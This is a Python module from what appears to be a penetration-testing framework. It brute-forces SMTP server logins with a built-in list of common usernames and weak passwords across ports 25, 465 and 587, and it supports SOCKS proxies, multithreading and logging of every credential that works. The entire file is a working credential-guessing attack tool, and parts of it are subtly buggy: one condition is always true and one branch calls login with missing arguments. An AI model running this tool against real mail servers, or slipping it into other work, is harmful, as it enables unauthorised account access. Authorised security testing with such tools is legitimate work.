#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import time
import socks
import socket
import smtplib
import json
import string
import random
import os
from core.alert import *
from core.targets import target_type
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file


def extra_requirements_dict():
    return {
        "smtp_brute_users": ["admin", "root", "test", "ftp", "anonymous", "user", "support", "1"],
        "smtp_brute_passwds": ["admin", "root", "test", "ftp", "anonymous", "user", "1", "12345",
                               "123456", "124567", "12345678", "123456789", "1234567890", "admin1",
                               "password!@#", "support", "1qaz2wsx", "qweasd", "qwerty", "!QAZ2wsx",
                               "password1", "1qazxcvbnm", "zxcvbnm", "iloveyou", "password", "p@ssw0rd",
                               "admin123", ""],
        "smtp_brute_ports": ["25", "465", "587"],
        "smtp_brute_split_user_set_pass": ["False"],
        "smtp_brute_split_user_set_pass_prefix": [""]
    }


def login(user, passwd, target, port, timeout_sec, log_in_file, language, retries, time_sleep, thread_tmp_filename,
          socks_proxy, scan_id, scan_cmd):
    exit = 0
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith(
            'socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(
                socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    while 1:
        try:
            if timeout_sec is not None:
                server = smtplib.SMTP(target, int(port), timeout=timeout_sec)
            else:
                server = smtplib.SMTP(target, int(port))
            server.starttls()
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                warn(messages(language, "smtp_connection_timeout").format(
                    target, port, user, passwd))
                return 1
        time.sleep(time_sleep)
    flag = 1
    try:
        server.login(user, passwd)
        flag = 0
    except smtplib.SMTPException as err:
        pass
    if flag is 0:
        info(messages(language, "user_pass_found").format(
            user, passwd, target, port))
        data = json.dumps({'HOST': target, 'USERNAME': user, 'PASSWORD': passwd, 'PORT': port, 'TYPE': 'smtp_brute',
                           'DESCRIPTION': messages(language, "login_successful"), 'TIME': now(), 'CATEGORY': "brute",
                           'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd}) + "\n"
        __log_into_file(log_in_file, 'a', data, language)
        __log_into_file(thread_tmp_filename, 'w', '0', language)
    else:
        pass
    try:
        server.quit()
    except Exception:
        pass
    return flag


def __connect_to_port(port, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
                      thread_number, total_req, socks_proxy):
    exit = 0
    port = int(port)
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith(
            'socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(
                socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    while 1:
        try:
            if timeout_sec is not None:
                server = smtplib.SMTP(target, int(port), timeout=timeout_sec)
            else:
                server = smtplib.SMTP(target, int(port))
            server.starttls()
            server.quit()
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                error(messages(language, "smtp_connection_failed").format(
                    target, port, str(num), str(total)))
                try:
                    __log_into_file(ports_tmp_filename, 'a',
                                    str(port), language)
                except:
                    pass
                break
        time.sleep(time_sleep)


def test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
               thread_number, total_req, verbose_level, socks_proxy):
    # test smtp
    _ports = ports[:]
    threads = []
    trying = 0
    for port in _ports:
        t = threading.Thread(target=__connect_to_port,
                             args=(
                                 port, timeout_sec, target, retries, language, num, total, time_sleep,
                                 ports_tmp_filename, thread_number, total_req, socks_proxy))
        threads.append(t)
        t.start()
        trying += 1
        if verbose_level > 3:
            info(messages(language, "trying_message").format(
                trying, total_req, num, total, target, port, 'smtp_brute'))
        while 1:
            n = 0
            for thread in threads:
                if thread.isAlive():
                    n += 1
                else:
                    threads.remove(thread)
            if n >= thread_number:
                time.sleep(0.01)
            else:
                break

    while 1:
        n = True
        for thread in threads:
            if thread.isAlive():
                n = False
        time.sleep(0.01)
        if n:
            break
    _ports = list(set(open(ports_tmp_filename).read().rsplit()))
    for port in _ports:
        try:
            ports.remove(int(port))
        except:
            try:
                ports.remove(port)
            except:
                pass
    os.remove(ports_tmp_filename)
    return ports


def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep,
          language, verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
    if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(target) != 'HTTP':
        # requirements check
        new_extra_requirements = extra_requirements_dict()
        if methods_args is not None:
            for extra_requirement in extra_requirements_dict():
                if extra_requirement in methods_args:
                    new_extra_requirements[
                        extra_requirement] = methods_args[extra_requirement]
        extra_requirements = new_extra_requirements
        if users is None:
            users = extra_requirements["smtp_brute_users"]
        if passwds is None:
            passwds = extra_requirements["smtp_brute_passwds"]
        if ports is None:
            ports = extra_requirements["smtp_brute_ports"]
        if extra_requirements["smtp_brute_split_user_set_pass"][0] not in ["False", "True"]:
            extra_requirements["smtp_brute_split_user_set_pass"][0] = "False"
        if target_type(target) == 'HTTP':
            target = target_to_host(target)
        threads = []
        total_req = int(
            len(users) * len(passwds) * len(ports) * len(extra_requirements["smtp_brute_split_user_set_pass_prefix"])) \
            if extra_requirements["smtp_brute_split_user_set_pass"][0] == "False" \
            else int(len(users) * len(ports) * len(extra_requirements["smtp_brute_split_user_set_pass_prefix"]))
        thread_tmp_filename = '{}/tmp/thread_tmp_'.format(load_file_path()) + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        ports_tmp_filename = '{}/tmp/ports_tmp_'.format(load_file_path()) + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        __log_into_file(thread_tmp_filename, 'w', '1', language)
        __log_into_file(ports_tmp_filename, 'w', '', language)
        ports = test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
                           thread_number, total_req, verbose_level, socks_proxy)
        trying = 0
        if extra_requirements["smtp_brute_split_user_set_pass"][0] == "False":
            for port in ports:
                for user in users:
                    for passwd in passwds:
                        t = threading.Thread(target=login, args=(
                            user, passwd, target, port, timeout_sec, log_in_file, language, retries, time_sleep,
                            thread_tmp_filename, socks_proxy,
                            scan_id, scan_cmd))
                        threads.append(t)
                        t.start()
                        trying += 1
                        if verbose_level > 3:
                            info(messages(language, "trying_message").format(trying, total_req, num, total, target, port,
                                                                             'smtp_brute'))
                        while 1:
                            n = 0
                            for thread in threads:
                                if thread.isAlive():
                                    n += 1
                                else:
                                    threads.remove(thread)
                            if n >= thread_number:
                                time.sleep(0.01)
                            else:
                                break
        else:
            keyboard_interrupt_flag = False
            for port in ports:
                for user in users:
                    for prefix in extra_requirements["smtp_brute_split_user_set_pass_prefix"]:
                        t = threading.Thread(target=login, args=(user, user.rsplit('@')[0] + prefix, target, port,
                                                                 timeout_sec, log_in_file, language,
                                                                 retries, time_sleep, thread_tmp_filename))
                        threads.append(t)
                        t.start()
                        trying += 1
                        if verbose_level > 3:
                            info(messages(language, "trying_message").format(trying, total_req, num, total, target, port,
                                                                             'smtp_brute'))
                        while 1:
                            try:
                                if threading.activeCount() >= thread_number:
                                    time.sleep(0.01)
                                else:
                                    break
                            except KeyboardInterrupt:
                                keyboard_interrupt_flag = True
                                break
                        if keyboard_interrupt_flag:
                            break
                    else:
                        break
                else:
                    break

        # wait for threads
        kill_switch = 0
        kill_time = int(
            timeout_sec / 0.1) if int(timeout_sec / 0.1) is not 0 else 1
        while 1:
            time.sleep(0.1)
            kill_switch += 1
            try:
                if threading.activeCount() is 1 or kill_switch is kill_time:
                    break
            except KeyboardInterrupt:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        if thread_write is 1 and verbose_level is not 0:
            data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': '', 'TYPE': 'smtp_brute',
                               'DESCRIPTION': messages(language, "no_user_passwords"), 'TIME': now(), 'CATEGORY': "brute",
                               'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd}) + "\n"
            __log_into_file(log_in_file, 'a', data, language)
        os.remove(thread_tmp_filename)
    else:
        warn(messages(language, "input_target_error").format(target))
